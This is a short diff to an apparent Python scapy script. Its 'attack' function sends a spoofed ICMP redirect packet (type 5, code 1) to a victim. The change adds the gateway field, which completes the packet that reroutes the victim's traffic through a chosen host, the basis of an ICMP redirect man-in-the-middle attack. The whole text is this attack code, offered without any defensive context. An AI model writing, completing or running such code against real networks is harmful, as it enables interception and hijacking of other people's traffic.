@@ -5,7 +5,7 @@ from scapy.all import *
 
 def attack(victim, source, gateway):
     ip = IP(dst=victim, src=source)
-    icmp = ICMP(type=5, code=1)
+    icmp = ICMP(type=5, code=1, gw=gateway)
     send(ip/icmp)
 
 def main():
